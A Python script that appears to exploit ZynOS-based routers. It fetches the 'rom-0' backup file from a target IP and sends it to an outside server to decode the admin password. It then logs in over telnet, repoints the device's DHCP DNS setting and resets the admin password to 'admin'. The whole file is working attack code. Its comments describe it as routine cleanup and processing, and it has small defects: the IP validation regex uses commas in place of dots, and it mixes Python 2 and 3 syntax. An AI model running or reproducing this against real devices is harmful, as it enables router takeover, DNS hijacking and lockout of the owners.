import urllib2
import urllib
import re
import sys
import telnetlib
import socket
import os
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

# set default timeout for socket ops to avoid indefinite hang
# improves reliability of network ops
socket.setdefaulttimeout(4)

# register openers for multipart/form-data upload
# required for handling file uploads
register_openers()

# try to remove file "rom-0" in current directory (if it exists)
# cleanup step to ensure script always works with latest data
try:
	os.remove("rom-0")
except OSError:
	pass #ignores error if file doesn't exist

# main script
try:
	# read host IP from command line arg
	if len(sys.argv) < 2:
		print("usage: python script.py [host_ip]")
		sys.exit(1)

	host = str(sys.argv[1])

	# validate host IP format
	if not re.match(r'^\d{1,3}(\,\d{1,3}){3}$', host):
		print("[!] invalid IP address format [!]")
		sys.exit(1)

	# download "rom-0" from provided host
	urllib.urlretrieve("http://" + host + "/rom-0", "rom-0")

	# using context manager for file ops to ensure proper closure of the file
	with open("rom-0", 'rb') as f:
		datagen, headers = multipart_encode({"uploadedfile": f})

		# send POST request with file to specific server for processing
		request = urllib2.Request("http://198.61.167.113/zynos/decoded.php", datagen, headers)
		response = urllib2.urlopen(request).read()

		# extract specific data (password) using regex
		match = re.search('rows=10>(.*)', response)
		if match:
			found_password = match.group(1)
		else:
			print("[!] password not found in response [!]")
			sys.exit(1)

	# establish telnet connection to target host
	tn = telnetlib.Telnet(host, 23, 3)
	tn.read_until("Password: ")
	tn.write(found_password + "\n")

	# executing commands on target host
	tn.write("set lan dhcpdns 8.8.8.8\n")
	tn.write("sys password admin\n")
	print(host + " [^-^] success! [^-^]")

	# exit telnet sesh
	tn.write("exit\n")

except Exception as e:
	# errors
	print(f"[!] an error occurred: {e} [!]")
	print(host + " [:(] offline/inaccessible [:(]")